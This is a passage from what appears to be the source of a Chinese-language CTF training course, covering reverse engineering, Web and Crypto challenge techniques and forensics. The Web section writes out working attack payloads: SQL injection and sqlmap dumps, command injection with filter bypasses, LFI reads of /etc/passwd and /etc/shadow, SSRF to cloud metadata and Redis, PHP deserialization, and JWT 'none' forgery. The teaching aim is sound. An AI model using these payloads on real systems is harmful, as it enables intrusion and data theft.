f\"Decrypted (XOR 0x42): {decrypted}\")\n        addr = addr.add(1)</code></pre></div>\n\n<div class=\"callout info\"><div class=\"callout-title\">Ghidra 脚本小贴士</div><p>打开 Window -> Script Manager（或按放大镜图标），可以浏览和运行所有脚本。你也可以创建自己的脚本目录。常用的 Ghidra 脚本包括：自动重命名函数、批量解密字符串、搜索特定指令模式等。</p></div>\n\n<h2>动态调试配合 Ghidra</h2>\n\n<p>有时候静态分析不够用，你需要动态运行程序来观察运行时行为。Ghidra 支持集成 GDB 进行动态调试：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\"># 方法一：使用 GDB + pwndbg 动态调试\n$ gdb -q ./crackme02\npwndbg> break *0x401234     # 在验证函数入口下断点\npwndbg> run \"testpassword\"  # 运行程序\n\n# 到达断点后，检查寄存器和内存\npwndbg> info registers\nrax   0x7fffffffe040  ← 输入字符串的地址\nrdi   0x7fffffffe040  ← 第一个参数（输入字符串）\n\npwndbg> x/s $rdi          # 查看输入字符串\n0x7fffffffe040: \"testpassword\"\n\n# 单步执行，观察每个字符的变换\npwndbg> stepi              # 单步执行一条指令\npwndbg> x/20xb $rdi       # 查看输入的十六进制值</code></pre></div>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\"># 方法二：使用 Ghidra 的 Debugger\n# 1. Window -> Debugger\n# 2. 在 Debugger 工具栏选择 GDB 连接器\n# 3. 点击 \"Launch\" 启动调试\n# 4. Ghidra 会同步显示当前执行的代码位置\n# 5. 你可以同时看到静态分析结果和动态运行时状态</code></pre></div>\n\n<h2>处理混淆技术</h2>\n\n<p>CTF 比赛中经常遇到的代码混淆技术：</p>\n\n<table>\n<tr><th>混淆类型</th><th>表现</th><th>应对方法</th></tr>\n<tr><td>控制流平坦化</td><td>大量 switch-case，看不出原始逻辑</td><td>动态调试跟踪执行路径</td></tr>\n<tr><td>字符串加密</td><td>strings 找不到关键字符串</td><td>找到解密函数，动态观察</td></tr>\n<tr><td>虚假代码</td><td>反编译出大量无意义代码</td><td>识别并删除 dead code</td></tr>\n<tr><td>不透明谓词</td><td>条件恒真/恒假的跳转</td><td>使用 Z3 等 SMT 求解器</td></tr>\n<tr><td>虚拟机保护</td><td>自定义指令集，反编译失败</td><td>分析 VM handler，模拟执行</td></tr>\n</table>\n\n<div class=\"callout warn\"><div class=\"callout-title\">遇到 VM 保护怎么办</div><p>如果你发现反编译出来的代码像是一个巨大的 while 循环加 switch-case，而且操作码看起来很奇怪（比如用数组模拟寄存器），那很可能是 VM 保护。这种情况下你需要先理解这个自定义 VM 的指令集，然后写一个模拟器来还原执行过程。这是逆向中最难的部分，通常在 CTF 决赛才会出现。</p></div>\n\n<div class=\"checkpoint\" data-cp=\"2\"></div>\n\n<h2>逆向工程速查清单</h2>\n\n<p>拿到一道逆向题时，按这个顺序来：</p>\n\n<ol>\n<li><strong>file</strong> —— 确认文件类型（ELF/PE/Mach-O）</li>\n<li><strong>strings</strong> —— 快速搜索明文信息</li>\n<li><strong>运行程序</strong> —— 了解输入输出行为</li>\n<li><strong>Ghidra 静态分析</strong> —— 从 main 开始追踪逻辑</li>\n<li><strong>GDB 动态调试</strong> —— 观察运行时数据</li>\n<li><strong>编写解题脚本</strong> —— 逆运算得到正确输入</li>\n</ol>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\"># 快速分析三板斧\n$ file crackme01           # 什么文件？\n$ strings crackme01        # 有什么字符串？\n$ strace ./crackme01 test  # 系统调用跟踪（能看到文件读写）\n\n# 如果程序被 strip 了（没有符号表）\n$ file crackme03\ncrackme03: ELF 64-bit LSB ... stripped  ← 没有符号表！\n\n# 用 Ghidra 依然可以分析\n# Ghidra 会自动识别 main 函数（通过 __libc_start_main 的参数）\n# 或者手动找到入口点：\n$ readelf -h crackme03 | grep Entry\n  Entry point address:               0x1060</code></pre></div>\n\n<button class=\"practice-link-btn\" onclick=\"navigate('ctf'); openCTF(4)\">▶ 挑战：XOR Crackme</button>\n<button class=\"practice-link-btn\" onclick=\"navigate('ctf'); openCTF(5)\">▶ 挑战：凯撒变体</button>";
+
+SECTION_CONTENT["ctfg-04-01"] = "<h1>CTF 题型速通指南</h1>\n\n<p>CTF 比赛中，Web 和 Crypto 是出镜率最高的两个方向。几乎每场比赛都有大量的 Web 题和 Crypto 题。这一节，我们用最实战的方式，带你快速掌握这两类题型的核心解题套路。</p>\n\n<h2>Part 1: Web 安全速通</h2>\n\n<h3>Web 题解题框架</h3>\n\n<p>拿到一道 Web 题，你应该按以下顺序操作：</p>\n\n<ol>\n<li><strong>浏览页面</strong>：用浏览器和 Burp Suite 观察所有页面和功能</li>\n<li><strong>查看源码</strong>：如果题目给了源码，优先分析源码</li>\n<li><strong>测试输入点</strong>：所有用户输入都是潜在的攻击面</li>\n<li><strong>检查响应头</strong>：Cookie、Server、X-Powered-By 等可能泄露信息</li>\n<li><strong>枚举目录</strong>：用 dirsearch/gobuster 扫描隐藏路径</li>\n</ol>\n\n<h3>SQL 注入实战</h3>\n\n<p>SQL 注入是 Web 题中最常见的考点。来看一个典型的场景：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\"># 题目给了一个搜索功能\n# 正常搜索：\nGET /search?q=admin HTTP/1.1\n\n# 响应：\n# {\"user\": \"admin\", \"role\": \"guest\", \"email\": \"admin@example.com\"}\n\n# 测试是否存在 SQL 注入\nGET /search?q=admin' HTTP/1.1\n# 响应：500 Internal Server Error ← 引号导致 SQL 语法错误，确认存在注入\n\n# 判断注入类型 —— 使用 UNION 注入\nGET /search?q=admin' UNION SELECT 1,2,3-- HTTP/1.1\n# 响应：{\"user\": \"1\", \"role\": \"2\", \"email\": \"3\"} ← 三列，可以用 UNION\n\n# 查看数据库信息\nGET /search?q=' UNION SELECT 1,database(),version()-- HTTP/1.1\n# 响应：{\"user\": \"1\", \"role\": \"ctf_db\", \"email\": \"5.7.42\"}\n\n# 查看表名\nGET /search?q=' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()-- HTTP/1.1\n# 响应：{\"role\": \"users,flags,secrets\"}\n\n# 读取 flag 表\nGET /search?q=' UNION SELECT 1,group_concat(flag_value),3 FROM flags-- HTTP/1.1\n# 响应：{\"role\": \"flag{sql_injection_still_works_in_2024}\"}</code></pre></div>\n\n<div class=\"callout info\"><div class=\"callout-title\">sqlmap 使用技巧</div><p>手动注入能帮你理解原理，但比赛中用 <code>sqlmap</code> 更高效。不过要注意：有些 CTF 平台禁止使用自动化扫描工具。</p></div>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\"># 使用 sqlmap 自动化\n$ sqlmap -u \"http://target/search?q=admin\" --dbs\n# 输出：\n# available databases [3]:\n# [*] information_schema\n# [*] ctf_db\n# [*] mysql\n\n$ sqlmap -u \"http://target/search?q=admin\" -D ctf_db --tables\n# 输出：\n# Database: ctf_db\n# +--------+\n# | flags  |\n# | users  |\n# +--------+\n\n$ sqlmap -u \"http://target/search?q=admin\" -D ctf_db -T flags --dump\n# 输出：\n# +-------------------------------+\n# | flag_value                    |\n# +-------------------------------+\n# | flag{sql_injection_still_works_in_2024} |\n# +-------------------------------+</code></pre></div>\n\n<h3>命令注入（Command Injection）</h3>\n\n<p>当 Web 应用将用户输入直接传给系统命令时，就会产生命令注入：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\"># 题目是一个 ping 工具\n# 正常输入：8.8.8.8\n# 后端执行：ping -c 4 8.8.8.8\n\n# 尝试命令注入\n# 输入：8.8.8.8; cat /flag.txt\n# 后端执行：ping -c 4 8.8.8.8; cat /flag.txt\n\n# 常用分隔符\n# ;  —— 顺序执行\n# |  —— 管道\n# || —— 前一个失败才执行\n# &  —— 后台执行\n# && —— 前一个成功才执行\n# \\n —— 换行（有时能绕过过滤）\n\n# 如果分号被过滤了，试试其他分隔符：\nGET /ping?ip=8.8.8.8|cat /flag.txt\nGET /ping?ip=8.8.8.8`cat /flag.txt`\nGET /ping?ip=8.8.8.8$(cat /flag.txt)\nGET /ping?ip=8.8.8.8%0acat /flag.txt   # URL 编码的换行</code></pre></div>\n\n<h3>文件包含（LFI / RFI）</h3>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\"># 题目有一个页面加载功能\nGET /page?file=about.html HTTP/1.1\n\n# 尝试本地文件包含 (LFI)\nGET /page?file=../../../etc/passwd HTTP/1.1\n# 响应：root:x:0:0:root:/root:/bin/bash ...\n\n# 读取 PHP 源码（使用 PHP filter）\nGET /page?file=php://filter/convert.base64-encode/resource=index.php HTTP/1.1\n# 响应：Base64 编码的 PHP 源码 → 解码后分析逻辑\n\n# 读取 flag\nGET /page?file=../../../flag HTTP/1.1\nGET /page?file=../../../flag.txt HTTP/1.1\nGET /page?file=/proc/1/environ HTTP/1.1    # 读取环境变量\n\n# 常用路径\n# /etc/passwd          系统用户\n# /etc/shadow          密码哈希（需要权限）\n# /flag, /flag.txt     CTF 常见的 flag 位置\n# /proc/self/environ   当前进程的环境变量\n# /proc/self/cmdline   当前进程的命令行参数\n# /var/log/apache2/access.log  Web 访问日志</code></pre></div>\n\n<h3>SSRF（服务端请求伪造）</h3>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\"># 题目有一个 URL 预览功能\nPOST /preview HTTP/1.1\nurl=http://example.com\n\n# SSRF 攻击：访问内部服务\nurl=http://127.0.0.1:8080/admin          # 访问内网管理面板\nurl=http://169.254.169.254/latest/meta-data/  # AWS 元数据\nurl=file:///etc/passwd                     # 读取本地文件\nurl=gopher://127.0.0.1:6379/_INFO%0d%0a   # 攻击内网 Redis\n\n# 常见内网地址\n# 127.0.0.1           本机\n# 10.0.0.0/8          内网 A 段\n# 172.16.0.0/12       内网 B 段\n# 192.168.0.0/16      内网 C 段\n# 169.254.169.254     云元数据服务</code></pre></div>\n\n<div class=\"checkpoint\" data-cp=\"0\"></div>\n\n<h3>PHP 反序列化</h3>\n\n<p>PHP 反序列化是 CTF Web 题中的高频考点。核心思路是构造恶意序列化数据，在反序列化时触发特定类的魔术方法：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-python\">#!/usr/bin/env python3\n# PHP 反序列化 payload 构造\n\n# 假设源码中有以下类：\n# class FileReader {\n#     public $filename;\n#     public function __destruct() {\n#         echo file_get_contents($this->filename);\n#     }\n# }\n\n# 我们需要构造一个 FileReader 对象，让 filename 指向 /flag\n# PHP 序列化格式：O:类名长度:\"类名\":属性数量:{属性定义}\n\npayload = 'O:10:\"FileReader\":1:{s:8:\"filename\";s:5:\"/flag\";}'\n\nprint(f\"Payload: {payload}\")\nprint(f\"URL 编码: {payload.replace(':', '%3A').replace(';', '%3B')}\")</code></pre></div>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\"># 发送 payload\n$ curl \"http://target/index.php\" \\\n  -d 'data=O:10:\"FileReader\":1:{s:8:\"filename\";s:5:\"/flag\";}'\n# 响应：flag{php_unserialize_is_dangerous}</code></pre></div>\n\n<h2>Part 2: Crypto 密码学速通</h2>\n\n<h3>古典密码识别</h3>\n\n<p>CTF 中的古典密码题，关键第一步是识别加密类型：</p>\n\n<table>\n<tr><th>特征</th><th>可能的加密类型</th><th>识别方法</th></tr>\n<tr><td>只含大/小写字母，频率分析有效</td><td>凯撒 / 替换密码</td><td>字母频率分布</td></tr>\n<tr><td>字母频率平坦</td><td>维吉尼亚密码</td><td>Kasiski / 重合指数</td></tr>\n<tr><td>只有两个字符（如 0/1 或 .- ）</td><td>摩尔斯 / 二进制</td><td>字符集</td></tr>\n<tr><td>5 列栅栏状排列</td><td>栅栏密码</td><td>尝试不同栏数</td></tr>\n<tr><td>字母位置被交换</td><td>置换密码</td><td>anagram 检测</td></tr>\n</table>\n\n<h3>凯撒密码解题</h3>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-python\">#!/usr/bin/env python3\n# 凯撒密码暴力破解\n\nciphertext = \"KHOOR ZRUOG\"\n\nprint(\"尝试所有偏移量：\")\nfor shift in range(26):\n    plaintext = ''\n    for c in ciphertext:\n        if c.isalpha():\n            base = ord('A') if c.isupper() else ord('a')\n            plaintext += chr((ord(c) - base - shift) % 26 + base)\n        else:\n            plaintext += c\n\n    print(f\"  偏移 {shift:2d}: {plaintext}\")\n\n# 输出：\n#   偏移  0: KHOOR ZRUOG\n#   偏移  1: JGNNQ YQTNF\n#   偏移  2: IFMMP XPSME\n#   偏移  3: HELLO WORLD  ← 偏移 3 就是答案！\n#   ...\n\n# 自动检测：使用频率分析或字典匹配\n# 对于英文文本，检查解密结果是否包含常见英文单词</code></pre></div>\n\n<button class=\"practice-link-btn\" onclick=\"navigate('ctf'); openCTF(6)\">▶ 挑战：经典凯撒</button>\n\n<h3>RSA 攻击全家桶</h3>\n\n<p>RSA 是 CTF Crypto 方向最重要的考点。以下是常见攻击场景：</p>\n\n<h4>场景 1：小指数攻击（e=3，明文较小）</h4>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-python\">#!/usr/bin/env python3\n# RSA 小指数攻击\n\n# 当 e=3 且 m^3 &lt; n 时，m^3 = c（没有取模），直接开三次方根\nfrom gmpy2 import iroot\n\ne = 3\nn = 265095991905180428990376443840557981703823565591441978209450421412837768249993317925594347856131542607939914995939593\nc = 7397033106042183307652580789602799789052047679597629113668468859136237340969828395954504207912526901393175411301984\n\n# 直接开 e 次方根\nm, is_exact = iroot(c, e)\nif is_exact:\n    flag = int(m).to_bytes((int(m).bit_length() + 7) // 8, 'big')\n    print(f\"[+] Flag: {flag.decode()}\")\nelse:\n    # 如果不精确，尝试 c + k*n 的方式\n    for k in range(1000):\n        m, is_exact = iroot(c + k * n, e)\n        if is_exact:\n            flag = int(m).to_bytes((int(m).bit_length() + 7) // 8, 'big')\n            print(f\"[+] Flag (k={k}): {flag.decode()}\")\n            break</code></pre></div>\n\n<h4>场景 2：共模攻击（Same n, different e）</h4>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-python\">#!/usr/bin/env python3\n# RSA 共模攻击\n# 当同一个明文用相同的 n 但不同的 e 加密时\n\nfrom gmpy2 import gcdext\n\nn = 1234567890123456789012345678901234567890123456789\ne1 = 17\ne2 = 23\nc1 = 987654321098765432109876543210987654321098765432\nc2 = 123456789012345678901234567890123456789012345678\n\n# 利用扩展欧几里得算法\n# e1*s1 + e2*s2 = gcd(e1, e2) = 1\n_, s1, s2 = gcdext(e1, e2)\n\n# m = c1^s1 * c2^s2 mod n\nif s1 < 0:\n    c1 = pow(c1, -1, n)  # 取模逆元\n    s1 = -s1\nif s2 < 0:\n    c2 = pow(c2, -1, n)\n    s2 = -s2\n\nm = (pow(c1, int(s1), n) * pow(c2, int(s2), n)) % n\nflag = int(m).to_bytes((int(m).bit_length() + 7) // 8, 'big')\nprint(f\"[+] Flag: {flag}\")</code></pre></div>\n\n<h4>场景 3：Wiener 攻击（d 太小）</h4>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-python\">#!/usr/bin/env python3\n# Wiener's Attack - 当私钥 d 太小时\n# 使用连分数展开来恢复 d\n\n# pip install owiener\nimport owiener\n\ne = 87453612875643210987654321098765432109876543210987654321\nn = 123456789012345678901234567890123456789012345678901234567890\nc = 987654321098765432109876543210987654321098765432109876543210\n\n# Wiener 攻击\nd = owiener.attack(e, n)\nif d:\n    print(f\"[+] 找到私钥 d = {d}\")\n    m = pow(c, d, n)\n    flag = int(m).to_bytes((int(m).bit_length() + 7) // 8, 'big')\n    print(f\"[+] Flag: {flag}\")\nelse:\n    print(\"[-] Wiener 攻击失败，d 不够小\")</code></pre></div>\n\n<div class=\"callout info\"><div class=\"callout-title\">RSA 工具推荐</div><p>做 RSA 题时，<code>RsaCtfTool</code> 是一个非常方便的工具，它能自动检测并执行多种 RSA 攻击。你只需要提供已知参数，它会自动尝试所有可能的攻击方式。</p></div>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\"># RsaCtfTool 使用示例\n$ python3 RsaCtfTool.py --n 1234567... --e 65537 --uncipher 9876543...\n[*] Testing: Wiener's attack\n[*] Testing: Small q attack\n[*] Testing: Fermat factorization\n[+] Attack: Fermat factorization\n[+] Found p = 11111111111...\n[+] Found q = 11111111111...\n[+] Cleartext: flag{rsa_attacks_are_fun}\n\n# 使用 factordb 在线分解\n$ pip3 install factordb-python\npython3 -c \"\nfrom factordb.factordb import FactorDB\nf = FactorDB(1234567890123456789012345678901234567890)\nf.connect()\nprint(f.get_factor_list())\n\"</code></pre></div>\n\n<div class=\"checkpoint\" data-cp=\"1\"></div>\n\n<h3>AES 相关攻击</h3>\n\n<p>AES 是现代密码学的核心。CTF 中的 AES 题通常考察实现错误：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-python\">#!/usr/bin/env python3\n# AES ECB 模式 - 分组重排攻击\n# ECB 模式下，相同的明文块会产生相同的密文块\n\nfrom Crypto.Cipher import AES\n\n# 假设我们观察到密文中某些块重复出现\n# 这意味着对应的明文块也相同\n\n# 已知：密文用 ECB 模式加密\n# 密文块1 = 密文块4，说明明文块1 = 明文块4\n\n# ECB penguin 问题：ECB 模式无法隐藏数据模式\n# 如果加密一张企鹅图片，你仍然能看出企鹅的轮廓\n\n# 实战：利用 ECB 的确定性来构造 payload\n# 假设有一个加密预言机，你可以在明文后面追加数据\n\ndef ecb_oracle_attack():\n    \"\"\"ECB 模式下的字节逐个破解\"\"\"\n    block_size = 16\n    known = b''\n\n    for i in range(block_size):\n        # 构造 padding，使得目标字节是当前块的最后一个字节\n        padding = b'A' * (block_size - 1 - i)\n\n        # 获取参考密文\n        ref_ciphertext = oracle_encrypt(padding)\n        ref_block = ref_ciphertext[:block_size]\n\n        # 逐个尝试所有可能的字节\n        for byte_val in range(256):\n            test_payload = padding + known + bytes([byte_val])\n            test_ciphertext = oracle_encrypt(test_payload)\n            test_block = test_ciphertext[:block_size]\n\n            if test_block == ref_block:\n                known += bytes([byte_val])\n                print(f\"[+] 破解第 {i+1} 字节: {chr(byte_val)}\")\n                break\n\n    return known</code></pre></div>\n\n<h3>XOR 密码分析</h3>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-python\">#!/usr/bin/env python3\n# 单字节 XOR 密钥破解（已知明文攻击）\n\nciphertext = bytes.fromhex(\"1b373733363f2f2c226b3c2a3c2f6b3a3b312e2f2c3f2f3a2e\")\n\n# 方法一：已知 flag 格式\n# 如果知道 flag 以 \"flag{\" 开头\nknown_prefix = b\"flag{\"\n\nfor key in range(256):\n    decrypted = bytes([b ^ key for b in ciphertext])\n    if decrypted[:5] == known_prefix:\n        print(f\"[+] 密钥: {hex(key)} ({key})\")\n        print(f\"[+] 解密: {decrypted.decode('utf-8', errors='replace')}\")\n        break\n\n# 方法二：频率分析（对英文文本有效）\ndef score_text(text):\n    \"\"\"评估文本是否像英文\"\"\"\n    english_freq = {\n        'e': 12.7, 't': 9.1, 'a': 8.2, 'o': 7.5, 'i': 7.0,\n        'n': 6.7, 's': 6.3, 'h': 6.1, 'r': 6.0, 'd': 4.3\n    }\n    score = 0\n    for c in text.lower():\n        score += english_freq.get(c, 0)\n    return score\n\nbest_score = 0\nbest_key = 0\nfor key in range(256):\n    decrypted = bytes([b ^ key for b in ciphertext])\n    try:\n        text = decrypted.decode('ascii')\n        s = score_text(text)\n        if s > best_score:\n            best_score = s\n            best_key = key\n    except:\n        continue\n\nprint(f\"[+] 最佳密钥: {hex(best_key)}\")\nprint(f\"[+] 解密结果: {bytes([b ^ best_key for b in ciphertext])}\")</code></pre></div>\n\n<h2>Web + Crypto 结合题</h2>\n\n<p>有些题目把 Web 和 Crypto 结合起来，比如 JWT 伪造：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\"># JWT 攻击：把算法改为 none\n# 原始 JWT header: {\"alg\":\"HS256\",\"typ\":\"JWT\"}\n# 修改为: {\"alg\":\"none\",\"typ\":\"JWT\"}\n\n# Base64url 编码修改后的 header\necho -n '{\"alg\":\"none\",\"typ\":\"JWT\"}' | base64 -w0 | tr '+/' '-_' | tr -d '='\n# 输出: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0\n\n# 构造伪造的 payload（以 admin 身份登录）\necho -n '{\"sub\":\"admin\",\"iat\":1234567890}' | base64 -w0 | tr '+/' '-_' | tr -d '='\n# 输出: eyJzdWIiOiJhZG1pbiIsImlhdCI6MTIzNDU2Nzg5MH0\n\n# 组装 JWT（注意签名为空）\n# eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTIzNDU2Nzg5MH0.\n\n$ curl http://target/api/profile \\\n  -H \"Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTIzNDU2Nzg5MH0.\"\n# 响应：{\"user\":\"admin\",\"flag\":\"flag{jwt_none_algorithm}\"}</code></pre></div>\n\n<div class=\"callout warn\"><div class=\"callout-title\">JWT 常见漏洞</div><p>除了 none 算法攻击，JWT 还有以下常见漏洞：RS256 降级为 HS256（用公钥签名）、密钥爆破（弱密钥）、kid 参数注入（SQL 注入或路径穿越）。遇到 JWT 题，先用 <code>jwt_tool</code> 全面检测。</p></div>\n\n<div class=\"checkpoint\" data-cp=\"2\"></div>\n\n<h2>Web Crypto 速查手册</h2>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\"># Web 工具速查\nburpsuite           # HTTP 代理和扫描\nsqlmap              # SQL 注入自动化\ndirsearch           # 目录爆破\nffuf                # 高速 Web Fuzzer\njwt_tool            # JWT 攻击工具\ncurl                # HTTP 请求利器\n\n# Crypto 工具速查\npython3 + pycryptodome  # AES/RSA/各种加密\nRsaCtfTool              # RSA 自动攻击\nhashcat / john          # 哈希破解\ncyberchef               # 在线万能解码器\ndcode.fr                # 古典密码在线识别\n\n# 编码/哈希 快速识别\n# Base64:  末尾有 = 号，A-Za-z0-9+/\n# Base32:  全大写 + 数字 2-7，末尾 = 号\n# Hex:     只有 0-9a-f\n# MD5:     32 位 hex\n# SHA1:    40 位 hex\n# SHA256:  64 位 hex\n# ROT13:   字母替换，a↔n, b↔o</code></pre></div>\n\n<button class=\"practice-link-btn\" onclick=\"navigate('ctf'); openCTF(7)\">▶ 挑战：SQL 注入入门</button>\n<button class=\"practice-link-btn\" onclick=\"navigate('ctf'); openCTF(8)\">▶ 挑战：RSA 解密</button>";
+
+SECTION_CONTENT["ctfg-05-01"] = "<h1>取证基础与工具链</h1>\n\n<p>数字取证是 CTF Misc 方向的核心技能。你会面对各种\"证据\"——磁盘镜像、内存转储、网络流量包、可疑文件——然后像侦探一样从中提取关键信息。这一节，我们用一个完整的取证场景，带你掌握核心工具链。</p>\n\n<h2>取证分析框架</h2>\n\n<p>无论面对什么类型的取证题，分析的基本框架都是一样的：</p>\n\n<ol>\n<li><strong>保护证据</strong>：永远在副本上操作，不要修改原始文件</li>\n<li><strong>识别类型</strong>：确定你面对的是什么类型的证据（磁盘/内存/网络/文件）</li>\n<li><strong>提取信息</strong>：使用合适的工具提取数据</li>\n<li><strong>关联分析</strong>：将碎片信息拼成完整的故事</li>\n<li><strong>找到 flag</strong>：通常在某个特定的数据中隐藏</li>\n</ol>\n\n<div class=\"callout info\"><div class=\"callout-title\">取证第一定律</div><p>在真实取证场景中，最重要的原则是\"不破坏证据\"。创建原始证据的位对位副本（bit-for-bit copy），所有分析都在副本上进行。CTF 比赛中通常给你的是文件副本，但养成好习惯很重要。</p></div>\n\n<h2>场景一：文件取证</h2>\n\n<p>题目给了你一个可疑文件 <code>evidence.bin</code>，你需要从中找到 flag。</p>\n\n<h3>第一步：识别文件类型</h3>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\"># 使用 file 命令查看文件类型\n$ file evidence.bin\nevidence.bin: data\n\n# file 没能识别——说明这不是标准格式，或者文件被修改了\n# 查看文件头部的十六进制\n$ xxd evidence.bin | head -20\n00000000: 8950 4e47 0d0a 1a0a 0000 000d 4948 4452  .PNG........IHDR\n00000010: 0000 0040 0000 0040 0802 0000 0000 2520  ...@...@......%\n00000020: 0000 0051 4944 4154 789c 6260 f80f 0000  ...QIDATx.`.....\n00000030: 0001 0001 0000 0000 0049 454e 44ae 4260  .........IEND.B`\n00000040: 8250 4b03 0414 0000 0008 0051 4321 5061  .PK........QC!Pa\n00000050: 4d50 0000 004d 0000 0008 0000 0066 6c61  MP...M.......fla\n00000060: 672e 7478 7478 9c2b 494d 2e51 48c9 4855  g.txtx..+IM.QH.HU\n\n# 看到了！文件头是 PNG 格式（89 50 4E 47）\n# 但是在偏移 0x40 处又出现了 PK 头——这是一个 ZIP 文件！</code></pre></div>\n\n<p>有意思！这个文件实际上是一个 PNG 图片和一个 ZIP 文件的组合。我们需要把它们分离出来。</p>\n\n<h3>第二步：用 binwalk 自动提取</h3>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\"># binwalk 是固件/文件分析的瑞士军刀\n$ binwalk evidence.bin\n\nDECIMAL       HEXADECIMAL     DESCRIPTION\n----------------------------------------------------\n0             0x0             PNG image, 64 x 64, 8-bit/color RGB, non-interlaced\n41            0x29            Zlib compressed data, default compression\n64            0x40            Zip archive data, at least v2.0 to extract,\n                              compression method: deflate\n153           0x99            End of Zip archive\n\n# 自动提取所有可识别的内容\n$ binwalk -e evidence.bin\n\n# 查看提取结果\n$ ls _evidence.bin.extracted/\n50.png    50          flag.txt\n\n# 直接读 flag！\n$ cat _evidence.bin.extracted/flag.txt\nflag{f1le_carv1ng_w1th_b1nwalk}</code></pre></div>\n\n<div class=\"callout success\"><div class=\"callout-title\">binwalk 太强了</div><p>binwalk 通过扫描文件中的\"魔术数字\"（magic bytes）来识别嵌入的文件类型。它能自动识别并提取数百种文件格式。但是，有些情况下 binwalk 可能无法自动提取——比如文件头被修改了，或者使用了自定义格式。</p></div>\n\n<h3>第三步：手动提取（当 binwalk 失效时）</h3>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\"># 如果 binwalk 没找到 ZIP，我们可以手动提取\n# ZIP 文件的魔术数字是 PK\\x03\\x04 (50 4B 03 04)\n\n# 找到 ZIP 数据的起始位置\n$ grep -boa \"PK\" evidence.bin\n64:PK\n\n# 从偏移 64 开始提取到文件末尾\n$ dd if=evidence.bin of=hidden.zip bs=1 skip=64\n96+0 records in\n96+0 records out\n96 bytes copied\n\n# 解压\n$ unzip hidden.zip\nArchive:  hidden.zip\n extracting: flag.txt\n\n$ cat flag.txt\nflag{f1le_carv1ng_w1th_b1nwalk}</code></pre></div>\n\n<div class=\"checkpoint\" data-cp=\"0\"></div>\n\n<h2>场景二：网络流量分析</h2>\n\n<p>题目给了一个网络流量包 <code>capture.pcap</code>，你需要从中找到可疑通信和 flag。</p>\n\n<h3>使用 tshark 快速分析</h3>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\"># tshark 是 Wireshark 的命令行版本\n# 先看看流量概况\n$ tshark -r capture.pcap -q -z io,stat,0\n=========================================\n| IO Statistics                           |\n|                                         |\n| Interval: 0.0000 &lt;&gt; 234.5678 sec       |\n|                                         |\n| Column 0: Frames and bytes              |\n|               |  Frames |      Bytes    |\n|-----------------------------------------|\n|           1   |    1523 |   1234567     |\n=========================================\n\n# 看看都有哪些协议\n$ tshark -r capture.pcap -q -z io,phs\nProtocol Hierarchy:\n  Frame  frames:1523  bytes:1234567\n    Ethernet  frames:1523  bytes:1234567\n      IPv4  frames:1523  bytes:1234567\n        TCP  frames:1200  bytes:987654\n          HTTP  frames:45  bytes:23456\n          TLS  frames:800  bytes:765432\n        UDP  frames:323  bytes:246913\n          DNS  frames:100  bytes:12345\n\n# 提取所有 HTTP 请求\n$ tshark -r capture.pcap -Y \"http.request\" -T fields \\\n  -e frame.number -e ip.src -e http.host -e http.request.uri\n1   192.168.1.100  target.local  /login\n2   192.168.1.100  target.local  /admin\n3   192.168.1.100  target.local  /api/flag</code></pre></div>\n\n<h3>提取 HTTP 传输的文件</h3>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\"># 导出 HTTP 传输的所有文件\n$ tshark -r capture.pcap --export-objects \"http,./http_files/\"\n\n$ ls http_files/\nlogin.html    admin.html    flag.dat\n\n# 查看 flag 文件\n$ cat http_files/flag.dat\n# 内容看起来是 Base64 编码的\n$ cat http_files/flag.dat | base64 -d\nflag{pcap_analysis_with_tshark}</code></pre></div>\n\n<h3>用 Wireshark 进行深度分析</h3>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\"># Wireshark 图形化分析（推荐在复杂场景中使用）\n$ wireshark capture.pcap &\n\n# Wireshark 常用显示过滤器：\n# http.request.method == \"POST\"     — 只看 POST 请求\n# http contains \"flag\"              — 搜索包含 flag 的 HTTP 包\n# dns.qry.name contains \"suspicious\" — 可疑 DNS 查询\n# ip.src == 192.168.1.100           — 只看特定来源\n# tcp.port == 443                   — 只看特定端口\n# data contains \"flag\"              — 在所有数据中搜索 flag\n# frame contains \"CTF\"              — 在所有帧中搜索 CTF\n\n# DNS 隧道检测（flag 可能藏在 DNS 